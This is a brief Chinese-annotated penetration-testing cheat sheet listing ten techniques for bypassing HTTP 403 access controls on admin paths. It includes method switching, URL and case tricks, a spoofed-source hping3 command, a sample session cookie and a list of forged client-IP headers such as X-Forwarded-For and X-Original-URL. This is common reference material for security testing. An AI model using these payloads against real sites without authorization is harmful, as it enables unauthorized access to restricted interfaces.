## 1. Bypass via HTTP Method

修改请求方式

```
GET /admin HTTP/2
POST /admin HTTP/2
```

## 2. URL Manipulation

添加后缀

```
/admin
/admin/
/admin?
/admin.php
```

## 3. Referrer Spoofing

添加 `Referer` , 伪造合法访问

```
Referer: https://www.example.com
```

## 4. IP Spoofing

伪造 IP 访问

```
hping3 -S -a 127.0.0.1 -p 80 example.com
```

## 5. Session Hijacking

窃取/伪造/删除 Cookie

```
Cookie: session=jJL9ASa9ZACpGXkq0fVVJQ1mx8K8tF20
```

## 6. CSRF

诱导用户访问恶意网址, 以用户的权限进行操作

## 7. HTTP Header Injection

修改请求头来伪造合法访问

```
X-Host: 127.0.0.1
X-Real-IP: 127.0.0.1
X-True-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwared-Host: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
```

```
GET / HTTP/2
Host: example.com
X-Original-URL: /invalid
```

## 8. Parameter Injection

添加缺失的参数

```
email=
phone=
pageNo=1&pageSize=10
{"pageNo" : 1,"pageSize": 10,}
```

## 9. Capital/Small

切换大小写

```
admin
ADMIN
aDmIn
```

## 10. Str Concat

字符串拼接

```
adm+in
```

---

**References**

- [记一次403绕过技巧](https://rivers.chaitin.cn/blog/cqq591p0lnec5jjugjeg)

